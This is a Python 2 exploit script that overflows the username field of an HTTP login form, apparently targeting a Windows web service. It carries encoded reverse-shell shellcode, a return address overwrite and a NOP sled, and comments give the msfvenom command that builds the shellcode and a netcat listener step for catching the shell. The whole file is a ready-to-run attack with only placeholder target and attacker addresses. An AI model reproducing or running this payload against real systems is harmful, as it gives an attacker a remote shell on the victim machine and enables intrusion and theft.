#!/usr/bin/python
#run netcat on port 4443
#Generating the shellcode:
#msfvenom -p windows/shell_reverse_tcp LHOST=your_ip_address LPORT=4443 EXITFUNC=thread -f c â€“e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
#Don't forget to edit target-ip-address below
import socket

try:
  print "\nSending evil buffer..."
  
  size = 800
  
  shellcode = ("\xda\xc5\xd9\x74\x24\xf4\xbd\xe1\xee\xd6\xc5\x58\x29\xc9\xb1"
"\x52\x31\x68\x17\x03\x68\x17\x83\x21\xea\x34\x30\x5d\x1b\x3a"
"\xbb\x9d\xdc\x5b\x35\x78\xed\x5b\x21\x09\x5e\x6c\x21\x5f\x53"
"\x07\x67\x4b\xe0\x65\xa0\x7c\x41\xc3\x96\xb3\x52\x78\xea\xd2"
"\xd0\x83\x3f\x34\xe8\x4b\x32\x35\x2d\xb1\xbf\x67\xe6\xbd\x12"
"\x97\x83\x88\xae\x1c\xdf\x1d\xb7\xc1\xa8\x1c\x96\x54\xa2\x46"
"\x38\x57\x67\xf3\x71\x4f\x64\x3e\xcb\xe4\x5e\xb4\xca\x2c\xaf"
"\x35\x60\x11\x1f\xc4\x78\x56\x98\x37\x0f\xae\xda\xca\x08\x75"
"\xa0\x10\x9c\x6d\x02\xd2\x06\x49\xb2\x37\xd0\x1a\xb8\xfc\x96"
"\x44\xdd\x03\x7a\xff\xd9\x88\x7d\x2f\x68\xca\x59\xeb\x30\x88"
"\xc0\xaa\x9c\x7f\xfc\xac\x7e\xdf\x58\xa7\x93\x34\xd1\xea\xfb"
"\xf9\xd8\x14\xfc\x95\x6b\x67\xce\x3a\xc0\xef\x62\xb2\xce\xe8"
"\x85\xe9\xb7\x66\x78\x12\xc8\xaf\xbf\x46\x98\xc7\x16\xe7\x73"
"\x17\x96\x32\xd3\x47\x38\xed\x94\x37\xf8\x5d\x7d\x5d\xf7\x82"
"\x9d\x5e\xdd\xaa\x34\xa5\xb6\x14\x60\xd2\xfb\xfd\x73\x1c\x15"
"\xa5\xfa\xfa\x7f\x49\xab\x55\xe8\xf0\xf6\x2d\x89\xfd\x2c\x48"
"\x89\x76\xc3\xad\x44\x7f\xae\xbd\x31\x8f\xe5\x9f\x94\x90\xd3"
"\xb7\x7b\x02\xb8\x47\xf5\x3f\x17\x10\x52\xf1\x6e\xf4\x4e\xa8"
"\xd8\xea\x92\x2c\x22\xae\x48\x8d\xad\x2f\x1c\xa9\x89\x3f\xd8"
"\x32\x96\x6b\xb4\x64\x40\xc5\x72\xdf\x22\xbf\x2c\x8c\xec\x57"
"\xa8\xfe\x2e\x21\xb5\x2a\xd9\xcd\x04\x83\x9c\xf2\xa9\x43\x29"
"\x8b\xd7\xf3\xd6\x46\x5c\x13\x35\x42\xa9\xbc\xe0\x07\x10\xa1"
"\x12\xf2\x57\xdc\x90\xf6\x27\x1b\x88\x73\x2d\x67\x0e\x68\x5f"
"\xf8\xfb\x8e\xcc\xf9\x29")
  
  filler = "A" * 780
  eip = "\x83\x0C\x09\x10"
  offset = "C" * 4
  nops = "\x90" * 10
  
  inputBuffer = filler + eip + offset + nops + shellcode
  content = "username=" + inputBuffer + "&password=A"

  buffer = "POST /login HTTP/1.1\r\n"
  buffer += "Host: target-ip-address\r\n"
  buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += "Accept-Language: en-US,en;q=0.5\r\n"
  buffer += "Referer: http://target-ip-addresslogin\r\n"
  buffer += "Connection: close\r\n"
  buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += "Content-Length: "+str(len(content))+"\r\n"
  buffer += "\r\n"
  
  buffer += content

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("target-ip-address", 80))
  s.send(buffer)
  
  s.close()
  
  print "\nDone!"
  
except:
  print "\nCould not connect!"
